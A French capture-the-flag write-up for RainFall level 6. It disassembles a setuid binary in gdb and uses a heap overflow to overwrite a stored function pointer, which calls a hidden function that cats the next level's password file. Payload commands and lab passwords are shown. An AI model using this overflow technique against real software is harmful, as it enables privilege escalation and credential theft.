## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level5
  $ ssh level6@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  level6@127.0.0.1's password d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
  [...]
  level6@RainFall:~$
  
  # On regarde ce qu'on a
  level6@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
    -rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
    -rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile

  # On teste les arguments
  level6@RainFall:~$ ./level6
    Segmentation fault (core dumped)
  level6@RainFall:~$ ./level6 test
    Nope
  level6@RainFall:~$ ./level6 test test
    Nope
  level6@RainFall:~$ ./level6 test test test
    Nope
  ```
  * On segfault sans arguments
  * On print Nope avec des arguments


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level6@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level6@RainFall:/tmp$ gdb ~/level6
      [...]
      Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    Non-debugging symbols:
      0x080482f4  _init
      0x08048340  strcpy
      0x08048340  strcpy@plt
      0x08048350  malloc
      0x08048350  malloc@plt
      0x08048360  puts
      0x08048360  puts@plt
      0x08048370  system
      0x08048370  system@plt
      0x08048380  __gmon_start__
      0x08048380  __gmon_start__@plt
      0x08048390  __libc_start_main
      0x08048390  __libc_start_main@plt
      0x080483a0  _start
      0x080483d0  __do_global_dtors_aux
      0x08048430  frame_dummy # Func frame_dummy
      0x08048454  n           # Func n
      0x08048468  m           # Func m
      0x0804847c  main        # Func main
      0x080484e0  __libc_csu_init
      0x08048550  __libc_csu_fini
      0x08048552  __i686.get_pc_thunk.bx
      0x08048560  __do_global_ctors_aux
      0x0804858c  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8048468
      0x8048468 <m>:	 "U\211\345\203\354\030\307\004$х\004\b\350\346\376\377\377\311\303U\211\345\203\344\360\203\354 \307\004$@"

    gdb-peda$ x/s 0x80485d1 # dans m()
      0x80485d1:	 "Nope"

    gdb-peda$ x/s 0x80485b0
      0x80485b0:	 "/bin/cat /home/user/level7/.pass"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Init, align, allocate 32 octets
      0x0804847c <+0>:	push   ebp
      0x0804847d <+1>:	mov    ebp,esp
      0x0804847f <+3>:	and    esp,0xfffffff0
      0x08048482 <+6>:	sub    esp,0x20 # 0x20 = 32

      # ESP + 28 = malloc(64)
      0x08048485 <+9>:	mov    DWORD PTR [esp],0x40     # Push 64 sur la stack
      0x0804848c <+16>:	call   0x8048350 <malloc@plt>   # Call malloc avec cet argument
      0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax # Stocke eax (retour de malloc) a ESP + 28

      # ESP + 24 = malloc(8)
      0x08048495 <+25>:	mov    DWORD PTR [esp],0x4      # Push 4 sur la stack
      0x0804849c <+32>:	call   0x8048350 <malloc@plt>   # Call malloc avec cet argument
      0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax # Stocke eax (retour de malloc) a ESP + 24

      # Stocke m() dans la heap (malloc stocké a ESP + 24)
      0x080484a5 <+41>:	mov    edx,0x8048468            # Met m() dans edx
      0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18] # Met dans eax le deuxième malloc a ESP + 24 
      0x080484ae <+50>:	mov    DWORD PTR [eax],edx      # Stocke edx (addresse de la fonction m) à l'addresse eax (deuxieme malloc)

      # Call strcpy(malloc(64), argv[1])
      0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]  # Stocke l'addresse EBP + 12 (ARGV) dans eax
      0x080484b3 <+55>:	add    eax,0x4                  # Fait avancer EAX de 4 => EAX = ARGV[1]
      0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]      # Met la valeur de ARGV[1] dans eax
      0x080484b8 <+60>:	mov    edx,eax                  # Met eax (ARGV[1]) dans edx
      0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c] # Met l'addresse ESP + 28 (1er malloc) dans eax
      0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx  # Push edx (argv[1]) sur la stack
      0x080484c2 <+70>:	mov    DWORD PTR [esp],eax      # Push eax (1er malloc) sur la stack
      0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>   # Call strcpy avec ces 2 arguments

      # Call m()
      0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18] # Met ESP + 24 dans eax
      0x080484ce <+82>:	mov    eax,DWORD PTR [eax]      # Met dans eax la valeur contenue dans ESP + 24 (2eme malloc qui contient l'addresse de m())
      0x080484d0 <+84>:	call   eax                      # Call eax (m())

      # return
      0x080484d2 <+86>:	leave
      0x080484d3 <+87>:	ret
      End of assembler dump.
  ```

  * Ok, donc on a un main qui strcpy notre parametre dans un malloc(64) (faaaaiiille) et qui call m.
  * m ne fait qu'afficher "Nope". Regardons n...

  ```shell
    Dump of assembler code for function n:
    # Initialisation, allocation 28 octets
    0x08048454 <+0>:	push   ebp
    0x08048455 <+1>:	mov    ebp,esp
    0x08048457 <+3>:	sub    esp,0x18

    # call system("/bin/cat /home/user/level7/.pass")
    0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0  # Push "/bin/cat /home/user/level7/.pass" sur la stack
    0x08048461 <+13>:	call   0x8048370 <system@plt>     # call system avec cet argument

    # Return
    0x08048466 <+18>:	leave
    0x08048467 <+19>:	ret
    End of assembler dump.
  ```

  * Ok on a une fonction n qui n'est pas appelée mais qui cat le fichier qu'on veut

## 2: Comportement
> Une fois recomposé, on comprend que le programme copie notre argument en parametre dans un buffer dans la heap et print "Nope".
> Une fonction qui cat notre flag n'est pas utilisée.

## 3: Exploit

### A: Explication

> On va grâce au strcpy non protégé faire un heap overflow et réécrire sur l'addresse de m contenue dans la heap.\
> En effet, quand on va overflow le malloc(64), on va réécrire sur le malloc(4) qui va être call.

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de n et à partir de combien de char on va réécrire sur le malloc(4)

```shell
  # Addresse de m (vu pendant l'analyse)
  gdb-peda$ info function n
    [...]
    0x08048454  n
    [...]

  # On cherche au bout de combien de char on réécrit sur le malloc(4)
  gdb-peda$ pattern create 200 pattern6
    Writing pattern of 200 chars to filename "pattern6"
  gdb-peda$ run $(cat pattern6)
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    [...]
    [-------------------------------------code-------------------------------------]
    # L'addresse non reconnue puisque c'est notre pattern
    Invalid $PC address: 0x65414149
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x65414149 in ?? ()
  gdb-peda$ pattern search
    Registers contain pattern buffer:
    [...]
    # On a notre offset
    EAX+0 found at offset: 72
    [...]
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de n(\x54\x84\x04\x08), on va pouvoir construire la string suivante:
- `./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
```shell
  level6@RainFall:/tmp$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > pattern6
```

* On lance l'exploit

```shell
level6@RainFall:/tmp$ ~/level6 $(cat pattern6)
  f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:/tmp$ su level7
  Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$
```
